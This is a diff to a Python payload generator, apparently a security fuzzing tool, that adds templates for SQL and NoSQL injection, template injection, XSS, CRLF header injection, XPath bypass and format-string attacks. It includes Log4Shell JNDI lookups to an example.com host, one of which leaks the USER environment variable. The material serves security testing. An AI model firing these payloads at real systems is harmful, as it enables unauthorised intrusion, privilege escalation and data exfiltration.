@@ -25,6 +25,28 @@ def _named_templates() -> Iterator[tuple[str, Callable[[str], str]]]:
     yield "path_win", lambda m: f"..\\{m}"
     yield "mssql_shell", lambda m: f"'; exec xp_cmdshell '{m}'--"
     yield "ldap_or", lambda m: f"*)(uid=*))(|(uid=*"
+    yield "sqli_union", lambda m: f"' UNION SELECT NULL,NULL,'{m}'--"
+    yield "sqli_pg_sleep", lambda m: f"';SELECT pg_sleep({m})--"
+    yield "sqli_mysql_sleep", lambda m: f"' OR SLEEP({m})--"
+    yield "sqli_stacked", lambda m: f"1; UPDATE users SET role='admin' WHERE id={m}--"
+    yield "nosql_where", lambda _m: '{"$where": "sleep(1000)"}'
+    yield "nosql_regex", lambda _m: '{"$regex": "^.*$"}'
+    yield "nosql_in", lambda _m: '{"$in": ["admin", "root"]}'
+    yield "ssti_jinja_math", lambda _m: "{{7*7}}"
+    yield "ssti_jinja_quote", lambda _m: "{{7*'7'}}"
+    yield "ssti_erb", lambda m: f"<%= {m} %>"
+    yield "ssti_freemarker", lambda m: f"<#assign x={m}>${{x}}"
+    yield "el_spel", lambda m: f"#{{{m}}}"
+    yield "log4shell_jndi", lambda m: f"${{jndi:ldap://{m}.example.com/a}}"
+    yield "log4shell_env", lambda _m: "${jndi:ldap://${env:USER}.example.com/a}"
+    yield "xss_img_onerror", lambda m: f"<img src=x onerror=alert('{m}')>"
+    yield "xss_script", lambda _m: "<script>alert(document.domain)</script>"
+    yield "xss_svg", lambda _m: "<svg/onload=alert(1)>"
+    yield "crlf_header_inject", lambda m: f"%0d%0aX-Injected:{m}%0d%0aSet-Cookie:role=admin"
+    yield "xpath_auth_bypass", lambda _m: "' or '1'='1"
+    yield "graphql_introspection", lambda _m: "{__schema{types{name}}}"
+    yield "format_string", lambda _m: "%n%n%s%s%x%x"
+    yield "expr_ognl", lambda m: f"%{{{m}}}"
 
 
 def _markers() -> Iterator[str]:
